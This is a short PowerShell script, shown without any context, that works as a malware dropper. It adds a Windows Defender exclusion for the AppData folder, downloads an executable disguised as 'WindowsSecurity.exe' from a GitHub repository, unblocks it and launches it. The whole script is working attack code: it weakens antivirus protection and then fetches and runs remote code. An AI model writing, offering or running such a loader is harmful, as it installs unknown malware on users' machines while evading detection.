$exePath = "$env:AppData\WindowsSecurity.exe"
$exeUrl = "https://github.com/zrxqzrxq123/asdasd/raw/refs/heads/main/WindowsSecurity.exe"

# 1. Add Exclusion for AppData
Add-MpPreference -ExclusionPath $env:AppData -ErrorAction SilentlyContinue

# 2. Download the EXE
Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -UserAgent "Mozilla/5.0" -ErrorAction SilentlyContinue

# 3. Unblock and Run
Unblock-File $exePath
Start-Process $exePath